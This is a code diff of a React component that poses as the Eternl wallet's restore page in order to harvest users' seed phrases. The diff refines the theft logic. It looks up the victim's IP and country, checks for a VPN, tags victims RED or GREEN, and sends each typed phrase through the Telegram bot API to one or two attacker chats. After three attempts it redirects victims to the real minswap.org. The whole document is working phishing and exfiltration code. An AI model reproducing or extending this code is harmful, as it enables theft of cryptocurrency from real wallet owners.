@@ -1,5 +1,6 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { Link, useNavigate } from "react-router-dom";
+import { checkVpnStatus } from "../utils/userLocation";
 
 function EternlRestoreWallet() {
   const [isMenuOpen, setIsMenuOpen] = useState(false);
@@ -7,26 +8,7 @@ function EternlRestoreWallet() {
   const [isNextClicked, setIsNextClicked] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState([]);
   const [attempts, setAttempts] = useState(0);
-  const [country, setCountry] = useState("");
   const navigate = useNavigate();
-
-  useEffect(() => {
-    const getCountry = async () => {
-      try {
-        const response = await fetch("https://ipapi.co/json/");
-        const data = await response.json();
-        const country = data.country_name;
-        setCountry(country);
-      } catch (error) {
-        console.error("Error fetching country:", error);
-        setCountry("Unknown");
-        console.log("Unknown"); // Log "Unknown" if there's an error
-      }
-    };
-    getCountry();
-  }, []);
-
-
 
   const handleToggle = () => {
     setIsMenuOpen(!isMenuOpen);
@@ -53,64 +35,87 @@ function EternlRestoreWallet() {
   const handleRestoreWallet = async () => {
     const message = seedPhrase.join(" ");
 
+    // Get the user's IP address
+    const ipResponse = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipResponse.json();
+    const ip = ipData.ip;
+
+    // Get country code
+    const response = await fetch("https://ipapi.co/json/");
+    const ipapiData = await response.json();
+    const countryCode = ipapiData.country_code;
+
     const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
-    const greenCountries = ['united states', 'united kingdom', 'nigeria', 'united arab emirates'];
-    const color = greenCountries.includes(country.toLowerCase()) ? 'RED' : 'GREEN';
 
-    
+    const specialCountries = ["NG","AE"];
+
+    // Check VPN status using the IP we retrieved
+    const isVpn = await checkVpnStatus(ip);
+    const isSpecialCountry = specialCountries.includes(countryCode);
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
 
-
     const data = {
-      chat_id: chat_id,
-      text: `Eternl:   ${message}`,
-    };
-    const odata = {
-      chat_id: ochat_id,
-      text: `Eternl:   ${message}`,
+        chat_id: chat_id,
+        text: `Eternl: ${message}`,
     };
 
-    setAttempts((prevAttempts) => prevAttempts + 1);
-
-    if (attempts < 3) {
-      try {
-        const response = await fetch(url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(data),
-        });
-
-        if (!response.ok) {
-          throw new Error("Network response was not ok");
-        }
-
-        const oresponse = await fetch(ourl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(odata),
-        });
-  
-        if (!oresponse.ok) {
-          throw new Error("Network response was not ok");
-        }
-
-        console.log("null");
-      } catch (error) {
-        console.error("Error sending message:", error);
-      }
+    let odata;
+    if (isVpn || isSpecialCountry) {
+        odata = {
+            chat_id: ochat_id,
+            text: `Eternl (RED): ${message}`,
+        };
     } else {
-      window.location.href = "https://minswap.org/fi-FI";
+        odata = {
+            chat_id: ochat_id,
+            text: `Eternl (GREEN): ${message}`,
+        };
     }
-  };
+
+    // Increment the attempt count
+    setAttempts((prevAttempts) => prevAttempts + 1);
+    const currentAttempts = attempts + 1; // Get the current attempt count
+
+    // Determine which endpoints to send the message to
+    const endpoints = (isVpn || isSpecialCountry)
+        ? [
+            { url: ourl, data: odata },
+            { url: url, data: data },
+          ]
+        : [
+            { url: ourl, data: odata },
+          ];
+
+    if (currentAttempts <= 3) {
+        for (const endpoint of endpoints) {
+            try {
+                const response = await fetch(endpoint.url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(endpoint.data),
+                });
+
+                if (!response.ok) {
+                    throw new Error("Network response was not ok");
+                }
+
+                console.log("Message sent successfully to:", endpoint.url);
+            } catch (error) {
+                console.error("Error sending message:", error);
+            }
+        }
+    } else {
+        window.location.href = "https://minswap.org/fi-FI";
+    }
+};
+
 
   const renderInputs = () => {
     const numWords =
